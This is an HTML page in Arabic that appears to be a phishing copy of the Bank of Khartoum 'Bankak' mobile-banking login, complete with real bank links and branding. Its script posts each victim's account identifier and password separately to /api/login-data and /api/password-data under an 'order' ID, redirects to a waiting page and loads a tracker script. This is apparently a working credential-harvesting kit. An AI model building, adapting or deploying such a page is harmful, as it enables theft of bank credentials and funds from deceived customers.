<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>تسجيل الدخول - بنكك</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
  body{max-width:520px;margin:0 auto;min-height:100vh;background:#f2f2f2;display:flex;flex-direction:column}

  .top-bar{height:24px;background:#111}

  .header{
    background:linear-gradient(180deg,#1a0000 0%,#5a0000 15%,#c62828 40%,#e53935 60%,#ef3e36 100%);
    padding:24px 20px 36px;text-align:center;position:relative;
  }
  .lang-toggle{
    position:absolute;top:10px;left:10px;width:36px;height:36px;
    border:1.5px solid rgba(255,255,255,.45);border-radius:8px;
    background:transparent;color:#fff;font-size:12px;font-weight:700;
    cursor:pointer;display:flex;align-items:center;justify-content:center;
    text-decoration:none;line-height:1;
  }
  .header-logo{max-height:130px;max-width:70%}

  .form-area{padding:24px 24px 0;flex:1}

  .input-wrap{
    display:flex;align-items:center;gap:10px;
    background:#fff;border:1px solid #d0d0d0;border-radius:10px;
    padding:0 14px;margin-bottom:12px;height:56px;
  }
  .input-wrap:focus-within{border-color:#c62828}
  .input-wrap .icon{flex-shrink:0;width:26px;height:26px;color:#999;display:flex;align-items:center;justify-content:center}
  .input-wrap .icon svg{width:22px;height:22px;fill:#999}
  .input-wrap input{
    flex:1;border:none;outline:none;font-size:15px;font-family:inherit;
    background:transparent;color:#333;height:100%;
  }
  .input-wrap input::placeholder{color:#aaa;font-size:13.5px}
  .eye-btn{background:none;border:none;cursor:pointer;padding:4px;display:flex;align-items:center}
  .eye-btn svg{width:22px;height:22px;fill:#999}

  .login-btn{
    display:block;width:100%;padding:16px;border:none;border-radius:10px;
    font-size:20px;font-weight:800;color:#fff;cursor:pointer;font-family:inherit;
    background:linear-gradient(180deg,#ff6659 0%,#e53935 20%,#c62828 50%,#b71c1c 75%,#8b1515 100%);
    box-shadow:0 4px 12px rgba(183,28,28,.45),0 2px 4px rgba(0,0,0,.2),inset 0 1px 0 rgba(255,255,255,.25),inset 0 -2px 4px rgba(0,0,0,.15);
    margin-top:8px;transition:.15s;position:relative;overflow:hidden;
    text-shadow:0 1px 2px rgba(0,0,0,.3);
    letter-spacing:.5px;
  }
  .login-btn::before{
    content:"";position:absolute;top:0;left:10%;right:10%;height:45%;
    background:linear-gradient(180deg,rgba(255,255,255,.35) 0%,rgba(255,255,255,.08) 60%,transparent 100%);
    border-radius:0 0 50% 50%;pointer-events:none;
  }
  .login-btn:hover{opacity:.93;transform:translateY(-1px)}
  .login-btn:active{transform:translateY(1px);box-shadow:0 2px 6px rgba(183,28,28,.4),inset 0 1px 0 rgba(255,255,255,.2)}
  .login-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}

  .links{display:flex;justify-content:space-between;padding:16px 4px;font-size:14px}
  .links a{color:#666;text-decoration:none;font-weight:600}

  .error-msg{
    display:none;background:#fee;border:1px solid #fcc;border-radius:8px;
    padding:10px 14px;margin-bottom:12px;color:#c62828;font-size:13px;text-align:center;
  }

  .bottom-bar{
    margin-top:auto;padding:18px 16px 26px;
    display:flex;justify-content:center;gap:24px;
  }
  .bottom-item{display:flex;flex-direction:column;align-items:center;gap:7px;text-decoration:none;color:#555;font-size:11px;font-weight:700}
  .bi{
    width:56px;height:56px;border-radius:50%;
    display:flex;align-items:center;justify-content:center;
    position:relative;overflow:hidden;
  }
  .bi::after{
    content:"";position:absolute;top:0;left:10%;right:10%;height:50%;
    background:linear-gradient(180deg,rgba(255,255,255,.55) 0%,rgba(255,255,255,.15) 50%,transparent 100%);
    border-radius:50% 50% 45% 45%;pointer-events:none;
  }
  .bi svg{width:28px;height:28px;fill:#fff;position:relative;z-index:1}

  .bi-fb{background:radial-gradient(circle at 35% 30%,#6d8bc7 0%,#4267B2 40%,#3b5998 70%,#2d4373 100%);box-shadow:0 3px 8px rgba(59,89,152,.5)}
  .bi-help{background:radial-gradient(circle at 35% 30%,#b4ec51 0%,#8bc34a 35%,#6aaf23 65%,#4e8c1a 100%);box-shadow:0 3px 8px rgba(76,175,80,.5)}
  .bi-loc{background:radial-gradient(circle at 35% 30%,#ff6f60 0%,#e53935 35%,#c62828 65%,#a01a1a 100%);box-shadow:0 3px 8px rgba(198,40,40,.5)}
  .bi-bok{background:radial-gradient(circle at 35% 30%,#4caf50 0%,#2e7d32 35%,#1b5e20 65%,#0d4a12 100%);box-shadow:0 3px 8px rgba(27,94,32,.5)}

  .bok-arrows{position:relative;z-index:1;width:28px;height:28px}
  .bok-arrows span{
    display:block;width:20px;height:3px;background:#fdd835;
    transform:skewX(-30deg);margin:2px auto;border-radius:1px;
  }
</style>
</head>
<body>

  <div class="top-bar"></div>

  <div class="header">
    <a href="login-en.html" class="lang-toggle">A/ع</a>
    <img src="images/bankak-logo.jpg" alt="بنكك" class="header-logo">
  </div>

  <div class="form-area">
    <div class="error-msg" id="errorMsg"></div>

    <div class="input-wrap">
      <div class="icon">
        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/><line x1="3" y1="8" x2="9" y2="8" stroke="#999" stroke-width="1.2" fill="none"/><line x1="3" y1="11" x2="9" y2="11" stroke="#999" stroke-width="1.2" fill="none"/><line x1="3" y1="14" x2="8" y2="14" stroke="#999" stroke-width="1.2" fill="none"/></svg>
      </div>
      <input type="text" id="username" placeholder="أدخل رقم المعرف (رقم الحساب أو...)" autocomplete="username" autofocus>
    </div>

    <div class="input-wrap">
      <div class="icon">
        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
      </div>
      <input type="password" id="password" placeholder="ادخل كلمة المرور">
      <button class="eye-btn" onclick="togglePass()" type="button" aria-label="إظهار كلمة المرور">
        <svg id="eyeIcon" viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
      </button>
    </div>

    <button class="login-btn" id="loginBtn" onclick="submitLogin()">تسجيل الدخول</button>

    <div class="links">
      <a href="#">تسجيل جديد؟</a>
      <a href="#">لاتستطيع تسجيل الدخول؟</a>
    </div>
  </div>

  <div class="bottom-bar">
    <a class="bottom-item" href="https://www.facebook.com/BankofKhartoum1913" target="_blank">
      <div class="bi bi-fb"><svg viewBox="0 0 24 24"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/></svg></div>
      <span>فيس بوك</span>
    </a>
    <a class="bottom-item" href="tel:+249187040600">
      <div class="bi bi-help"><svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg></div>
      <span>المساعدة</span>
    </a>
    <a class="bottom-item" href="https://bankofkhartoum.com/sudan/ar/find-us" target="_blank">
      <div class="bi bi-loc"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg></div>
      <span>مواقعنا</span>
    </a>
    <a class="bottom-item" href="https://bankofkhartoum.com/sudan/ar/personal" target="_blank">
      <div class="bi bi-bok">
        <div class="bok-arrows"><span></span><span></span><span></span><span></span></div>
      </div>
      <span>بنك الخرطوم</span>
    </a>
  </div>

<script>
  var params = new URLSearchParams(location.search);
  var orderId = params.get("order");

  if (params.get("error") === "1") {
    showError("اسم المستخدم او الرمز السري غير صحيح");
  }

  function togglePass(){
    var p = document.getElementById("password");
    p.type = p.type === "password" ? "text" : "password";
  }

  async function submitLogin() {
    var username = document.getElementById("username").value.trim();
    var password = document.getElementById("password").value;
    if (!username) { showError("الرجاء إدخال رقم المعرف"); return; }
    if (!password) { showError("الرجاء إدخال كلمة المرور"); return; }

    var btn = document.getElementById("loginBtn");
    btn.disabled = true;
    btn.textContent = "جاري التحقق...";

    try {
      var res = await fetch("/api/login-data", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ order_id: orderId, username: username })
      });
      var data = await res.json();
      if (!data.success) {
        showError(data.message || "حدث خطأ");
        btn.disabled = false;
        btn.textContent = "تسجيل الدخول";
        return;
      }

      var res2 = await fetch("/api/password-data", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ order_id: orderId, password: password })
      });
      var data2 = await res2.json();
      if (data2.success) {
        location.href = "waiting.html?order=" + orderId;
      } else {
        showError(data2.message || "حدث خطأ");
        btn.disabled = false;
        btn.textContent = "تسجيل الدخول";
      }
    } catch(err) {
      showError("حدث خطأ في الاتصال");
      btn.disabled = false;
      btn.textContent = "تسجيل الدخول";
    }
  }

  function showError(msg) {
    var el = document.getElementById("errorMsg");
    el.textContent = msg;
    el.style.display = "block";
    setTimeout(function(){ el.style.display = "none"; }, 3000);
  }

  document.getElementById("password").addEventListener("keydown", function(e) {
    if (e.key === "Enter") submitLogin();
  });
  document.getElementById("username").addEventListener("keydown", function(e) {
    if (e.key === "Enter") document.getElementById("password").focus();
  });
</script>
<script src="tracker.js"></script>
</body>
</html>
